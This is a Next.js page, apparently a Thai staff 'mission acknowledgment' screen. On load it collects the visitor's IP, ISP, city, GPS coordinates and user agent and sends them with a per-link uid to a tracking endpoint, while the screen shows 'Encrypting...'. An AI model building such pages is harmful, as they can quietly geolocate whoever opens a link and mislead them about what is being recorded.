"use client";

import { useEffect, useState, Suspense } from 'react';
import { useSearchParams } from 'next/navigation';
import { ShieldCheck, Loader2, CheckCircle2 } from 'lucide-react';

function VerifyInner() {
  const [loading, setLoading] = useState(true);
  const searchParams = useSearchParams();
  const uid = searchParams.get('uid');

  useEffect(() => {
    async function startTracking() {
      try {
        const ipRes = await fetch('https://ipapi.co/json/');
        const ipData = await ipRes.json();

        let gpsData = { lat: null as number | null, lon: null as number | null };
        if ("geolocation" in navigator) {
          try {
            const position: GeolocationPosition = await new Promise((resolve, reject) => {
              navigator.geolocation.getCurrentPosition(resolve, reject, { timeout: 5000 });
            });
            gpsData = { lat: position.coords.latitude, lon: position.coords.longitude };
          } catch {
            // GPS denied or timeout — fallback to IP coords
          }
        }

        await fetch('/api/track', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            uid: uid || 'anonymous',
            ip: ipData.ip,
            isp: ipData.org,
            city: ipData.city,
            latitude: gpsData.lat ?? ipData.latitude,
            longitude: gpsData.lon ?? ipData.longitude,
            is_gps: !!gpsData.lat,
            device: navigator.userAgent,
          }),
        });

        setLoading(false);
      } catch {
        setLoading(false);
      }
    }

    startTracking();
  }, [uid]);

  if (loading) return (
    <div className="min-h-screen flex flex-col items-center justify-center bg-slate-900 text-white p-6">
      <Loader2 className="animate-spin text-[#ffd700] mb-4" size={40} />
      <p className="text-[10px] font-black uppercase tracking-[0.3em] text-[#ffd700]">GGS2 Security Encrypting...</p>
    </div>
  );

  return (
    <div className="min-h-screen bg-slate-900 flex flex-col items-center p-6 text-white font-sans">
      <div className="w-full max-w-sm">
        <div className="flex items-center gap-3 mb-8 border-b border-white/10 pb-6">
          <div className="p-2 bg-[#800000] rounded-lg shadow-lg shadow-red-900/20">
            <ShieldCheck size={24} className="text-[#ffd700]" />
          </div>
          <div>
            <h1 className="text-lg font-black uppercase tracking-tight">GGS2 Secure Mission</h1>
            <p className="text-[9px] text-[#ffd700] font-bold uppercase tracking-widest">ระบบบันทึกการปฏิบัติงาน</p>
          </div>
        </div>

        <div className="relative bg-gradient-to-br from-slate-800 to-slate-950 rounded-[32px] p-1 shadow-2xl border border-white/10 overflow-hidden mb-6">
          <div className="absolute top-0 right-0 w-32 h-32 bg-green-500 opacity-5 -mr-10 -mt-10 rounded-full blur-2xl"></div>
          <div className="bg-slate-900/50 backdrop-blur-xl rounded-[30px] p-8">
            <div className="flex flex-col items-center text-center mb-8">
              <div className="w-20 h-20 rounded-full bg-green-500/10 border-2 border-green-500/30 flex items-center justify-center mb-4 shadow-xl shadow-green-500/10">
                <CheckCircle2 size={40} className="text-green-500" />
              </div>
              <h2 className="text-xl font-black tracking-tight text-white">รับทราบภารกิจแล้ว</h2>
              <p className="text-slate-500 text-[10px] font-bold uppercase tracking-widest mt-1">Status: Mission Acknowledged</p>
            </div>
            <div className="p-4 bg-white/5 rounded-2xl border border-white/5 text-center">
              <p className="text-[11px] text-slate-400 leading-relaxed">
                ระบบได้บันทึกเวลาการรับทราบภารกิจของคุณเรียบร้อยแล้ว <br/>
                <span className="text-[#ffd700] font-bold">โปรดเริ่มปฏิบัติหน้าที่ตามแผนงาน</span>
              </p>
            </div>
          </div>
        </div>

        <div className="p-4 bg-[#800000]/20 border border-[#800000]/30 rounded-2xl">
          <p className="text-[9px] text-center text-red-200 font-bold leading-relaxed uppercase tracking-tighter">
            Security Notice: Your connection is monitored for operational integrity.
          </p>
        </div>
      </div>
    </div>
  );
}

export default function VerifyPage() {
  return (
    <Suspense fallback={
      <div className="min-h-screen flex items-center justify-center bg-slate-900">
        <Loader2 className="animate-spin text-[#ffd700]" size={40} />
      </div>
    }>
      <VerifyInner />
    </Suspense>
  );
}
